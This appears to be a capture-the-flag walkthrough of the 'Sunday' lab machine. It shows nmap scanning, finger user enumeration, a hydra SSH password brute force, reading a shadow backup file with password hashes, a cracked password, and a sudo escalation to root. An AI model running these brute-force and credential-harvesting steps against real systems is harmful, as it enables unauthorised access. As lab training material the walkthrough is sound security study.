![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2bc47b81-aad3-4fab-bb66-c2ca5921adf3)

first enumeration with nmap

```
# Nmap 7.93 scan initiated Sun Jun  4 12:11:15 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 79,111,515,6787,22022 -Pn 10.10.10.76
Nmap scan report for 10.10.10.76                                                   
Host is up (0.17s latency).                                                        
                                                                                   
PORT      STATE SERVICE  VERSION                                                   
79/tcp    open  finger?                                                            
| fingerprint-strings:                                                             
|   GenericLines:                                                                  
|     No one logged on                                                             
|   GetRequest:                                                                    
|     Login Name TTY Idle When Where                                               
|     HTTP/1.0 ???                                                                 
|   HTTPOptions:                                                                   
|     Login Name TTY Idle When Where                                               
|     HTTP/1.0 ???                                                                                                                                                     
|     OPTIONS ???                                                                  
|   Help:                                                                          
|     Login Name TTY Idle When Where                                               
|     HELP ???                                                                     
|   RTSPRequest:                                                                   
|     Login Name TTY Idle When Where                                               
|     OPTIONS ???                                                                  
|     RTSP/1.0 ???                                                                 
|   SSLSessionReq, TerminalServerCookie:                                           
|_    Login Name TTY Idle When Where                                                                                                                                   
|_finger: No one logged on\x0D                                                     
111/tcp   open  rpcbind  2-4 (RPC #100000)                                         
515/tcp   open  printer                                                            
6787/tcp  open  ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| http-title: Solaris Dashboard                                                                                                                                        
|_Requested resource was https://10.10.10.76:6787/solaris/                                                                                                             
| ssl-cert: Subject: commonName=sunday                                                                                                                                 
| Subject Alternative Name: DNS:sunday                                             
| Not valid before: 2021-12-08T19:40:00                                            
|_Not valid after:  2031-12-06T19:40:00
|_ssl-date: TLS randomness does not represent time                                 
| tls-alpn:                                                                                                                                                            
|_  http/1.1                                                                       
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
22022/tcp open  ssh      OpenSSH 7.5 (protocol 2.0)                                
| ssh-hostkey:                                                                     
|   2048 aa0094321860a4933b87a4b6f802680e (RSA)                                    
|_  256 da2a6cfa6bb1ea161da654a10b2bee48 (ED25519)                                 
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-serv
ice :                                                                              
SF-Port79-TCP:V=7.93%I=7%D=6/4%Time=647C715C%P=x86_64-pc-linux-gnu%r(Gener         
SF:icLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20\         
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20         
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20         
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\         
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x2                                                                                             
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?         
SF:\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?         
SF:\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20         
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20         
SF:\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\x         
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\         
SF:?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20         
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20
SF:When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\         
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x2         
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x2         
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SSL         
SF:SessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x2         
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x2         
SF:0\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20\         
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20         
SF:\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\x                                                                                             
SF:20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20T         
SF:TY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\         
SF:x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2         
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");                                                                                                                      
                                                                                                                                                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                         
# Nmap done at Sun Jun  4 12:13:02 2023 -- 1 IP address (1 host up) scanned in 107.37 seconds
```

### Enumerating finger Port - 79 

Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/613e1671-1310-4037-a9eb-bdba9d31b440)

found a finger-userenum script on github, let's check for available users 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e13dbdac-2305-4f1c-962f-ee532fc0169c)

run the script, got 2 users `sunny` & `sammy`...

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Sunday/finger-user-enum]
└─$ hydra -l sunny -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt 10.10.10.76 -s 22022 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-04 13:50:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9999 login tries (l:1/p:9999), ~625 tries per task
[DATA] attacking ssh://10.10.10.76:22022/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 9823 to do in 00:56h, 16 active
[STATUS] 152.00 tries/min, 456 tries in 00:03h, 9543 to do in 01:03h, 16 active
[STATUS] 142.29 tries/min, 996 tries in 00:07h, 9003 to do in 01:04h, 16 active
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-04 14:01:43
```
bruteforcing ssh password for user `sunny` and boom we got the password.

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Sunday/finger-user-enum]
└─$ ssh sunny@sunday.htb -p 22022
The authenticity of host '[sunday.htb]:22022 ([10.10.10.76]:22022)' can't be established.
ED25519 key fingerprint is SHA256:t3OPHhtGi4xT7FTt3pgi5hSIsfljwBsZAUOPVy8QyXc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? ys
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[sunday.htb]:22022' (ED25519) to the list of known hosts.
(sunny@sunday.htb) Password: 
Warning: at least 15 failed authentication attempts since last successful authentication.  The latest at Sun Jun 04 13:01 2023.
Last login: Sun Jun  4 13:01:21 2023 from 10.10.14.16
Oracle Corporation      SunOS 5.11      11.4    Aug 2018
sunny@sunday:~$ id
uid=101(sunny) gid=10(staff)
sunny@sunday:~$ 
```
cool we are in ssh as user `sunny`. let's escalate privs.


## Privilege Escalation

```
sunny@sunday:~$ cat .bash_history 
su -                
su -              
cat /etc/resolv.conf  
su -                  
ps auxwww|grep overwrite
su -                   
sudo -l                                                                            
sudo /root/troll                                                                   
ls /backup      
ls -l /backup
cat /backup/shadow.backup
sudo /root/troll
sudo /root/troll
su -
sudo -l
sudo /root/troll
ps auxwww
ps auxwww
ps auxwww
top
top
top
ps auxwww|grep overwrite
su -
su -
cat /etc/resolv.conf 
ps auxwww|grep over
sudo -l
sudo /root/troll
sudo /root/troll
sudo /root/troll
sudo /root/troll
sunny@sunday:~$ cat cat /backup/shadow.backup
cat: cannot open cat: No such file or directory
mysql:NP:::::::
openldap:*LK*::::::: 
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
in user sunny dir, checking `.bash_history` file, we can see a backup shadow file, checking the content of the shadow fle we got to read user `sammy` password hash. let's crack the hash. hash crackd to be `cooldude!` as the password.

```
sunny@sunday:~$ su sammy
Password: 
Warning: 10 failed authentication attempts since last successful authentication.  The latest at Sun Jun 04 13:16 2023.
sammy@sunday:~$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
sammy@sunday:~$ sudo su
Password: 
root@sunday:/home/sunny# cd
root@sunday:~# 
```
su user `sammy` with th password found, and checking for sudo prive we can run sudo with all commands. sudo su gave us a root shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9e7726fb-fa18-44c4-9f77-269ac51e2d2f)

and we are through. 😜




